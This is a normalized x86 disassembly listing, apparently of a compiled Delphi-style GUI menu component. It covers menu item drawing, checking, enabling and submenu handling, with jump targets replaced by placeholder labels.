mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44d3b4
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42146c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_420f30
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_42046c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4032e8
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_4500b0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451517
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44f174
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_4212cc
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_4500b0
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_451664
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_452048
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_451694
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_4516e0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4518c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_4034e4
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_451694
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_452048
mov esi eax
mov eax edi
call sub_451664
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_404444
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402cfc
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4040d0
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_44f174
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404344
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4518c9
lea eax [ ebp - 0x24 ]
call sub_404038
lea eax [ ebp - 0x10 ]
call sub_404038
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4500b0
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_4518f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_404444
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_40408c
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45191c
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_451a8c
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_451a9c
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_451964
sub_451964
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_450020
push eax
call CheckMenuItem
mov eax esi
call sub_45191c
sub_4519b8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_451a8c
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_450020
push eax
call EnableMenuItem
sub_451a30
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_451df0
mov edx eax
mov ecx ebx
mov eax edi
call sub_44ffc0
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_45191c
sub_451a9c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_417570
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44f0c8
sub_451b0c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_451a8c
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_451af4
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_451e24
mov ecx ebx
mov edx esi
mov eax edi
call sub_451c18
sub_451b54
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_451a8c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_451a9c
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_451bac
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_451a8c
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_451a9c
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_451a9c
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_451c18
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_44f0c8
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_44ffc0
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_4175ec
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_451e90
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_451a8c
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44fef0
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_417570
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_417570
mov dl [ eax + 0x3f ]
mov eax esi
call sub_451a30
sub_451ccc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_44f0c8
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_451a8c
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44fef0
mov eax ebx
call sub_451a8c
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_417570
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_417460
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_451d40
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_451964
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_451a74
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_451a74
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_451e08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_451a8c
mov edx eax
mov ecx esi
mov eax ebx
call sub_451c18
pop esi
pop ebx
retn
sub_451e24
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_451df0
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_451ccc
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44f0c8
sub_451e4c
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_451e90
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_451e90
jmp r-xdata
mov eax ebx
call sub_44fef0
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_453b68
sub_451ee8
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_425790
mov [ ebx + 0x4c ] eax
sub_451f10
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_4032e8
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4521a4
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_4034e4
mov edx ebx
mov eax edi
call sub_41d168
mov eax ebx
mov si 0xffee
call sub_4034e4
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_451f80
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_425790
mov [ esi + 0x4c ] eax
sub_451fb4
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_451a8c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_451a9c
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_451ff4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_451e24
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_451e08
jmp r-xdata
mov edx ebx
mov eax esi
call sub_451e08
sub_452058
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_45191c
sub_452084
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_4518f4
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_451964
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_4519b8
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_40408c
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_451ae4
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_451a30
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_451ac0
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_451ad4
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_4521a4
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_451a74
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_4034e4
sub_4521c8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4521e8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452208
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452228
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452248
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452268
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452288
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4522a8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4522c8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4522e8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_417bf8
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_44c5f0
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_44c728
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_44c788
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_44c488
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_44c848
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_452360
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41d3b4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_451a74
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_451f10
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_4523b4
jmp r-xdata
xor edx edx
mov eax esi
call sub_44fe78
sub_4523b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_44d84c
mov eax ebx
call sub_452424
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_44d890
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_41d168
sub_4523fc
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_4523fc
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44f54c
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_451e90
mov eax ebx
pop esi
pop ebx
retn
sub_452438
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c484
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_404598
sub_452468
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_4040d0
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
